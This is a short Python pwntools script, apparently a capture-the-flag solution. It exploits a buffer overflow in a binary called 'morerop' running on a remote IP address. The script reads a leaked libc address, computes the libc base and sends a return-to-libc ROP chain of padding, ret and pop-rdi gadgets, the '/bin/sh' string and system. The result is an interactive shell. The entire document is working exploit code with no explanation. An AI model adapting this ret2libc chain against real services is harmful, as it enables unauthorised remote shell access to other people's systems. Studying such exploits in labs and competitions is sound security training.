from os import system
from pwn import * 
# p = process("./morerop",env={"LD_PRELOAD":"libc.so.6"})
p = remote("3.101.12.127",5005)
elf = context.binary = ELF("./morerop")
# context.terminal = "vscode"
libc = ELF("libc.so.6")
# gdb.attach(p)
p.recvline()
p.recvline()
leak = p.recvline()[:-1]
leak = int(leak,16)
libc.address = leak - 0x84450
system = libc.sym.system
print(libc.address)
binsh = next(libc.search(b'/bin/sh'))
print()
ret =0x000000000040101a
rdi = 0x0000000000401303
payload= flat(b"a"*88 ,ret,rdi,binsh,system)
p.recvline()
p.sendline(payload)

p.interactive() 